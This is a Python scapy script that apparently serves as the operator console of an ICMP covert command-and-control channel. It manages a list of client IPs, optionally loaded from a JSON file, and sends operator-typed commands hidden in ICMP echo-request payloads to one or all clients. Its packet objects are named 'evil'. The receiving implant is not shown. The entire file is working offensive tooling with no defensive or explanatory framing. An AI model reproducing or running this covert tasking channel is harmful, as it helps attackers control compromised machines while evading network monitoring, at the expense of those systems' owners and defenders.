from scapy.all import * 
from scapy.all import ICMP,IP
import json

DEBUG = True
JSONFILE = "example.json"

def print_help():
    print("\taddclient <IP_ADDRESS>   Adds new client by IP")
    print("\tshowclients              Show all added clients")
    print("\tremoveclient <ID>        Removes a client by ID")
    print("\tremoveallclients         Removes all clients")
    print("\tsend <ID> <message>      Send message to client at ID")
    print("\tsendtoall <message>      Sends <message> to all clients")
    print("\tkill                     Stops server")
    print("\thelp                     Prints this")

# Add clients to the dictionary of clients, the IP from arguments, and the id
def addclient(clients, arguments, id):
    clients[id] = arguments[1] 
    if DEBUG: print(f"[DEBUG] Client {id} added at {clients.get(id)}") 
    id += 1
    return id

def json_add_client(ip, clients, id):
    clients[id] = ip
    id += 1
    return id

# Show all clients within the client dictionary 
def showclients(clients):
    for client in clients:
        print(f"Client {client} at {clients.get(client)}")

# Remove the client by client ID
def removeclient(arguments, clients):
    if len(arguments)<2: 
        print("[ERROR] Specify client by ID")
    else:
        if DEBUG: print(f"[DEBUG] Client {arguments[1]} removed from {clients.get(int(arguments[1]))}") 
        clients.pop(int(arguments[1]))

# Remove all clients within the client dictionary
def removeallclients(clients):
    clients.clear()
    if DEBUG: print(f"[DEBUG] All clients removed")

# Send command to client by ID via ICMP data
def send_command(arguments, clients):
    try:
        clientcommand = arguments[1] 
        clienttokens = clientcommand.split(" ", 1)
        if clients.get(int(clienttokens[0])) != None:
            evil = IP(dst=clients.get(int(clienttokens[0])))/ICMP(type=8)/(clienttokens[1])
            send(evil)
            if DEBUG: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
        else:
            print(f"[ERROR] No client at ID {clienttokens[0]}")
    except:
        print("[ERROR] Usage: send <ID> <message>")

def sendtoall(arguments, clients):
    for client in clients:
        evil = IP(dst=clients.get(client))/ICMP(type=8)/(arguments[1])
        if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
        send(evil)

def valid_IP(arguments):
    a = arguments[1].split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True

def generate_targets(JSONFILE, clients, id):
    f = open(JSONFILE, 'r')
    data = json.loads(f.read())
    for jsonip in data:
        ip = data[jsonip]
        id = json_add_client(ip, clients, id)
    f.close()
    return id

def main():
    clients = dict()
    id = 0
    while(True):
        command = input(">> ")
        arguments = command.split(" ", 1)
        if arguments[0] == "":
            continue
        elif arguments[0] == "addclient":
            if len(arguments)<2: 
                print("[ERROR] Missing client IP field")
                continue
            if valid_IP(arguments): 
                id = addclient(clients, arguments, id)
            else:
                print("[ERROR] Invalid IP Address")
        elif arguments[0] == "showclients":
            showclients(clients)
        elif arguments[0] == "removeclient":
            removeclient(arguments, clients)
        elif arguments[0] == "removeallclients":
            removeallclients(clients)
        elif arguments[0] == "send":
            send_command(arguments, clients)
        elif arguments[0] == "sendtoall":
            sendtoall(arguments, clients)
        elif arguments[0] == "test":
            id = generate_targets(JSONFILE, clients, id)
        elif arguments[0] == "kill":
            break
        elif arguments[0] == "help":
            print_help()
        else:
            print("Invalid option, use \"help\" for available commands")


if __name__ == "__main__":
    main()